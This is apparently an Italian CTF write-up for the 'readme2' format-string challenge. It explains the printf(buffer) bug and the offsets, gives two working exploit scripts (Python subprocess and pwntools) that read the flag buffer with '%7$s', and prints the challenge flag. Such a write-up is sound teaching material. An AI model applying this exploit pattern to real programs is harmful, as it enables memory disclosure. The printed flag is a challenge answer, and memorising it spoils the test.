# readme2 - PWN (Format String --> Arbitrary Read)

**Flag:** `CTFlearn{ju57_4n_4rb17r4ry_r34d}`

## Analisi
Il programma stampa l'indirizzo del buffer della flag (`printf("Flag buffer: %p\n", flag)`) e poi fa `printf(buffer)` sul nostro input --> format string. Conoscendo l'indirizzo, con `%s` facciamo una **arbitrary read** di quella memoria.

Dettagli trovati sul binario:
- il nostro input compare all'offset di formato **6**
- se mettiamo l'indirizzo come primi 8 byte, i suoi `00` finali chiuderebbero la stringa: quindi mettiamo prima lo specificatore e poi l'indirizzo all'offset **7**.

## Soluzione - passo per passo
Va fatto in un solo processo (l'indirizzo cambia a ogni esecuzione per via dell'ASLR). Script pronto:

1. Entra nella cartella:
   ```
   cd readme2
   ```
2. Esegui:
   ```
   python3 -c '
   import subprocess, struct, re
   p = subprocess.Popen(["./task"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
   first = p.stdout.readline()
   addr = int(re.search(rb"0x[0-9a-f]+", first).group(), 16)
   payload = b"%7\$s".ljust(8, b"A") + struct.pack("<Q", addr) + b"\n"
   out, _ = p.communicate(payload)
   print(out.decode("latin1"))
   '
   ```
   Output --> `CTFlearn{ju57_4n_4rb17r4ry_r34d}`

### Versione con pwntools (equivalente)
```python
from pwn import *
io = process('./task')
io.recvuntil(b'buffer: '); addr = int(io.recvline(), 16)
io.sendline(b'%7$s'.ljust(8, b'A') + p64(addr))
print(io.recvall())
```

